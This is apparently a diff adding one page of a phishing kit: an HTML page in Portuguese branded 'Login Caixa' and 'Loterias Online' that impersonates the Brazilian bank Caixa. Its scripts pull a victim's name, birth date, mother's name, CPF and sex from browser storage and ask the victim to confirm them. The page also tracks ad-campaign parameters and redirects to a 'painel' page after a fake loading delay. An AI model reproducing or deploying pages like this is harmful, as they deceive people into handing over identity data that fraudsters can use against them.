@@ -1,0 +1,362 @@
+<!DOCTYPE html><html lang="pt-br"><head>
+    <script>
+    // Captura os UTMs assim que a página carregar
+    document.addEventListener('DOMContentLoaded', function() {
+      const urlParams = new URLSearchParams(window.location.search);
+      
+      // Tentar pegar UTMs salvos do localStorage
+      let savedUtms = {};
+      try {
+        const saved = localStorage.getItem('utmParams');
+        if (saved) {
+          savedUtms = JSON.parse(saved);
+        }
+      } catch (e) {
+        console.error('Erro ao ler UTMs do localStorage:', e);
+      }
+      
+      // Capturar UTMs da URL atual (prioridade) ou usar os salvos
+      const utmParams = {
+        utm_source: urlParams.get('utm_source') || savedUtms.utm_source || null,
+        utm_medium: urlParams.get('utm_medium') || savedUtms.utm_medium || null,
+        utm_campaign: urlParams.get('utm_campaign') || savedUtms.utm_campaign || null,
+        utm_content: urlParams.get('utm_content') || savedUtms.utm_content || null,
+        utm_term: urlParams.get('utm_term') || savedUtms.utm_term || null,
+        src: urlParams.get('src') || savedUtms.src || null,
+        sck: urlParams.get('sck') || savedUtms.sck || null
+      };
+      
+      // Salvar no localStorage apenas se houver valores válidos
+      const hasValidUtms = Object.values(utmParams).some(val => val !== null && val !== '');
+      if (hasValidUtms) {
+        localStorage.setItem('utmParams', JSON.stringify(utmParams));
+        console.log('UTMs capturados:', utmParams); // Debug
+      }
+    });
+  </script>
+
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Loterias Online</title>
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&display=swap" rel="stylesheet">
+
+    <style>
+      @font-face {
+        font-family: 'Futura-Book';
+        src: url('fonts/Futura-Book.eot');
+        src: url('fonts/Futura-Book.eot#iefix') format('embedded-opentype'),
+             url('fonts/Futura-Book.woff2') format('woff2'),
+             url('fonts/Futura-Book.woff') format('woff'),
+             url('fonts/Futura-Book.ttf') format('truetype'),
+             url('images/Futura-Book.svg#Futura-Book') format('svg');
+        font-weight: normal;
+        font-style: normal;
+        font-display: swap;
+      }
+
+      body {
+        font-family: 'Futura-Book' !important;
+      }
+
+      .container-bg {
+        background: linear-gradient(45deg, #00a9ad, #005ca9);
+        background-size: 100%;
+        background-repeat: no-repeat;
+        height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+      }
+
+      .container-principal {
+        height: auto;
+        margin: 0 auto;
+        background-color: white;
+        width: 450px;
+        max-width: 95%;
+        color: black;
+        background-color: #fff !important;
+        border-radius: .4rem;
+        box-shadow: 0px 4px 8px rgb(0 0 0 / 30%);
+        padding: 3rem 4rem;
+      }
+
+      @media (max-width: 576px) {
+        .container-principal {
+          padding: 3rem 2rem !important;
+        }
+      }
+
+      .container-principal img {
+        width: 150px;
+      }
+
+      .container-principal h1 {
+        color: #0070ae;
+        font-size: 1rem;
+        margin-top: .4rem;
+      }
+
+      .container-principal h2 {
+        color: #4d7880;
+        font-size: 1.1rem;
+        margin-top: 1rem;
+        margin-bottom: .5rem;
+        width: 100%;
+        text-align: justify;
+      }
+
+      .container-principal h3 {
+        color: #0070ae;
+        font-size: 1rem;
+        margin-top: 1.1rem;
+      }
+
+      .container-principal h3 a {
+        color: #0070ae;
+        font-weight: 600;
+      }
+
+      .container-principal form {
+        width: 100%;
+        display: flex;
+        justify-content: start;
+        color: #4d7880;
+        font-size: 1.1rem;
+        margin-top: .4rem;
+      }
+
+      .container-principal form label {
+        margin-left: .4rem;
+      }
+
+      .botoes {
+        margin-top: 1rem;
+      }
+
+      .botoes a {
+        width: 100%;
+      }
+
+      .botoes button {
+        background-color: #f39200;
+        color: white;
+        font-weight: 500;
+        width: 100%;
+        border: none;
+        padding: .5rem 1rem;
+        font-size: 1rem;
+        border-radius: .2rem;
+        margin-bottom: .6rem;
+        position: relative;
+        overflow: hidden;
+        transition: all 0.3s ease;
+        cursor: pointer;
+      }
+
+      .botoes button.processing {
+        opacity: 0.7;
+        pointer-events: none;
+      }
+
+      .botoes button::before {
+        content: '';
+        position: absolute;
+        top: 0;
+        left: -100%;
+        width: 100%;
+        height: 100%;
+        background: linear-gradient(
+          90deg,
+          transparent,
+          rgba(255, 255, 255, 0.3),
+          transparent
+        );
+        animation: brilho 3s infinite;
+      }
+
+      @keyframes brilho {
+        0% {
+          left: -100%;
+        }
+        50% {
+          left: 100%;
+        }
+        100% {
+          left: 100%;
+        }
+      }
+
+      .botoes button:hover {
+        background-color: #173e68;
+        box-shadow: 0 4px 12px rgba(23, 62, 104, 0.3);
+      }
+
+      button.btn-nao {
+        background-color: transparent !important;
+        border: solid 2px #f39200;
+        color: #f39200;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container-bg">
+      <div class="container-principal d-flex justify-content-center align-items-center flex-column">
+        <img src="images/logo-caixa.webp" alt="">
+        <h1>Login Caixa</h1>
+        <h2>Para continuar, confirme se os seus dados estão corretos.</h2>
+
+        <h2>Nome:</h2>
+        <form>
+          <input type="radio" checked="">
+          <label id="nomeLabel">Carregando...</label><br>
+        </form>
+
+        <h2>Data de nascimento:</h2>
+        <form>
+          <input type="radio" checked="" disabled="">
+          <label id="nascimentoLabel">Carregando...</label><br>
+        </form>
+
+        <h2>Nome da mãe:</h2>
+        <form>
+          <input type="radio" checked="" disabled="">
+          <label id="nome_maeLabel">Carregando...</label><br>
+        </form>
+
+        <div class="botoes w-100 d-flex flex-column justify-content-center align-items-center">
+          <button id="btnConfirmar" onclick="redirecionarParaPainel()">Sim, sou eu</button>
+        </div>
+
+        <h3><a href="">Preciso de ajuda</a></h3>
+      </div>
+    </div>
+
+    <!-- UTMify UTMs Script -->
+    <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+
+    <script>
+      document.addEventListener('DOMContentLoaded', function () {
+        try {
+          // Buscar dados tratados do localStorage
+          const nome = localStorage.getItem('nome');
+          const nascimento = localStorage.getItem('nascimento');
+          const nome_mae = localStorage.getItem('nome_mae');
+          const cpf = localStorage.getItem('cpf');
+          const sexo = localStorage.getItem('sexo');
+
+          // Função para formatar data de nascimento (se necessário)
+          function formatarData(data) {
+            if (!data) return '';
+            // Se a data vier no formato '1999-08-10 00:00:00', converter para '10/08/1999'
+            if (data.includes(' ')) {
+              const partes = data.split(' ')[0].split('-');
+              if (partes.length === 3) {
+                return `${partes[2]}/${partes[1]}/${partes[0]}`;
+              }
+            }
+            return data;
+          }
+
+          // Preencher campo Nome
+          const nomeLabel = document.getElementById('nomeLabel');
+          if (nome && nomeLabel) {
+            nomeLabel.textContent = nome.toUpperCase();
+          } else if (nomeLabel) {
+            nomeLabel.textContent = 'Dados não encontrados';
+            nomeLabel.style.color = '#dc3545';
+          }
+
+          // Preencher campo Data de nascimento
+          const nascimentoLabel = document.getElementById('nascimentoLabel');
+          if (nascimento && nascimentoLabel) {
+            nascimentoLabel.textContent = formatarData(nascimento);
+          } else if (nascimentoLabel) {
+            nascimentoLabel.textContent = 'Dados não encontrados';
+            nascimentoLabel.style.color = '#dc3545';
+          }
+
+          // Preencher campo Nome da mãe
+          const nome_maeLabel = document.getElementById('nome_maeLabel');
+          if (nome_mae && nome_maeLabel) {
+            nome_maeLabel.textContent = nome_mae.toUpperCase();
+          } else if (nome_maeLabel) {
+            nome_maeLabel.textContent = 'Dados não encontrados';
+            nome_maeLabel.style.color = '#dc3545';
+          }
+
+          // Log para debug (opcional)
+          console.log('Dados carregados do localStorage:', {
+            nome: nome,
+            nascimento: nascimento,
+            nome_mae: nome_mae,
+            cpf: cpf,
+            sexo: sexo
+          });
+
+        } catch (error) {
+          console.error('Erro ao carregar dados do localStorage:', error);
+          // Exibir mensagem de erro nos campos
+          const labels = ['nomeLabel', 'nascimentoLabel', 'nome_maeLabel'];
+          labels.forEach(labelId => {
+            const label = document.getElementById(labelId);
+            if (label) {
+              label.textContent = 'Erro ao carregar dados';
+              label.style.color = '#dc3545';
+            }
+          });
+        }
+      });
+
+      // Função para redirecionar para painel com delay
+      function redirecionarParaPainel() {
+        const button = document.getElementById('btnConfirmar');
+        
+        if (button) {
+          // Adicionar classe de processamento
+          button.classList.add('processing');
+          button.textContent = 'Carregando...';
+        }
+        
+        // Redirecionar após 2 segundos (simulando carregamento)
+        setTimeout(() => {
+          // Capturar UTMs da URL atual e do localStorage
+          const urlParams = new URLSearchParams(window.location.search);
+          const utmParams = new URLSearchParams();
+          
+          // Tentar pegar UTMs salvos do localStorage
+          let savedUtms = {};
+          try {
+            const saved = localStorage.getItem('utmParams');
+            if (saved) {
+              savedUtms = JSON.parse(saved);
+            }
+          } catch (e) {
+            console.warn('Erro ao ler UTMs do localStorage:', e);
+          }
+          
+          // Mesclar UTMs: prioridade para URL, depois localStorage
+          const utmFields = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term', 'src', 'sck'];
+          utmFields.forEach(key => {
+            const urlValue = urlParams.get(key);
+            const savedValue = savedUtms[key];
+            // Prioridade: URL > localStorage
+            const value = urlValue || savedValue;
+            if (value) {
+              utmParams.append(key, value);
+            }
+          });
+          
+          const utmString = utmParams.toString() ? '?' + utmParams.toString() : '';
+          window.location.href = './painel' + utmString;
+        }, 2000);
+      }
+    </script>
+
+    <script src="js/bootstrap.bundle.min.js"></script>
+  
+
+</body></html>
